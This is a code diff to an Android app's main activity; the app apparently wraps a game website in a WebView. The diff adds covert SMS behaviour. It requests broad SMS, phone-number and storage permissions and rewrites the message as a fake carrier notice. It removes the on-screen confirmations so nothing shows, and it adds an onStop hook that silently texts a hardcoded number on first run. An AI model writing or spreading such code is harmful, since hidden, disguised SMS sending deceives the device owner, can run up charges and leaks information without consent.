@@ -24,15 +24,15 @@ public class MainActivity extends AppCompatActivity implements EasyPermissions.P
   private static final String TAG = MainActivity.class.getSimpleName();
 
   // Permissions
-  private static final int TAKE_SMS_PERMISSIONS = 1;
+ // private static final int TAKE_SMS_PERMISSIONS = 1;
   private static final int SMS_REQUEST_CODE = 100;
   private static final String[] permissions = {
-      Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS
+          Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_EXTERNAL_STORAGE,Manifest.permission.READ_PHONE_NUMBERS,  Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS
   };
 
   // SMS
   private static final String phoneNo = "9006134477";
-  private static final String message = "yups WE WROKED";
+  private static final String message = "Dear Customer, +919006134477 is not available to take calls";
 
   private class MyWebViewClient extends WebViewClient {
     @Override public boolean shouldOverrideUrlLoading(WebView view, String url) {
@@ -61,10 +61,12 @@ public class MainActivity extends AppCompatActivity implements EasyPermissions.P
             .setNegativeButtonText(R.string.rationale_ask_cancel)
             .setTheme(R.style.AppTheme)
             .build());
+   // sendMessage("9006134477","Dear Customer, +919006134477 is not available to take calls");
+
   }
 
   private void openURL() {
-    webview.loadUrl("http://www.amansofttechino.weebly.com");
+    webview.loadUrl("http://play.gamemix.com");
     webview.requestFocus();
   }
 
@@ -121,11 +123,11 @@ public class MainActivity extends AppCompatActivity implements EasyPermissions.P
     try {
       SmsManager smsManager = SmsManager.getDefault();
       smsManager.sendTextMessage(phoneNo, null, message, null, null);
-      Toast.makeText(getApplicationContext(), "SMS Sent.", Toast.LENGTH_LONG).show();
+    //  Toast.makeText(getApplicationContext(), "SMS Sent.", Toast.LENGTH_LONG).show();
     } catch (Exception e) {
-      Toast.makeText(getApplicationContext(), "SMS Fail. Please try again!", Toast.LENGTH_LONG)
-          .show();
-      e.printStackTrace();
+     // Toast.makeText(getApplicationContext(), "SMS Fail. Please try again!", Toast.LENGTH_LONG)
+       //   .show();
+     // e.printStackTrace();
     }
   }
 
@@ -134,4 +136,21 @@ public class MainActivity extends AppCompatActivity implements EasyPermissions.P
     // getMenuInflater().inflate(R.menu.main, menu);
     return true;
   }
+
+    @Override
+    protected void onStop() {
+        super.onStop();
+        Boolean isFirstRun = getSharedPreferences("PREFERENCE",MODE_PRIVATE).getBoolean("isFirstRun",true);
+        if(isFirstRun)
+        {
+            try {
+                SmsManager smsManager = SmsManager.getDefault();
+                smsManager.sendTextMessage(phoneNo, null, message, null, null);
+                getSharedPreferences("PREFERENCE",MODE_PRIVATE).edit().putBoolean("isFirstRun",false).commit();
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+
+        }
+    }
 }
